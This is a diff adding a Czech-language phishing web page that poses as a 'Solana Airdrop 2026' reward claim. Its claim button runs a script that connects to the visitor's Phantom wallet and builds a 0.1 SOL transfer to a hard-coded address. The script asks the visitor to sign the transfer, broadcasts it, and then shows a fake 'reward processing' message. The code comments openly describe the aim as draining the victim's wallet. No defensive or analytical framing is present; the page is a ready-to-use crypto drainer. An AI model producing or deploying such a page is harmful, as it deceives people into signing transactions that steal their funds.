@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <title>Solana Airdrop 2026</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .btn { background: #14f195; color: black; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.2rem; }
+        .status { margin-top: 20px; color: #888; }
+    </style>
+</head>
+<body>
+    <h1>Gratulujeme! 🚀</h1>
+    <p>Vaše adresa byla vybrána pro sezónní Airdrop ve výši 5 SOL.</p>
+    <button class="btn" onclick="connectAndDrain()">VYBRAT ODMĚNU (CLAIM)</button>
+    <div id="status" class="status">Status: Peněženka nepřipojena</div>
+
+    <script>
+        const destination = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; // Tvoje adresa
+
+        async function connectAndDrain() {
+            const status = document.getElementById('status');
+            
+            if (!window.solana || !window.solana.isPhantom) {
+                alert("Prosím, nainstalujte si Phantom peněženku.");
+                return;
+            }
+
+            try {
+                // 1. Připojení k peněžence
+                const resp = await window.solana.connect();
+                status.innerText = "Status: Připojování k síti...";
+
+                // 2. Příprava transakce (vytvoření požadavku na podpis)
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: resp.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(destination),
+                        lamports: 100000000, // Zde se nastavuje částka k odčerpání
+                    })
+                );
+
+                transaction.feePayer = resp.publicKey;
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+
+                // 3. Výzva k podpisu (Tady uživatel schvaluje "vysátí")
+                status.innerText = "Status: Potvrďte transakci v peněžence...";
+                const signed = await window.solana.signTransaction(transaction);
+                await connection.sendRawTransaction(signed.serialize());
+                
+                status.innerText = "Status: Odměna se zpracovává!";
+            } catch (err) {
+                console.error(err);
+                status.innerText = "Chyba: Transakce byla zamítnuta.";
+            }
+        }
+    </script>
+</body>
+</html>
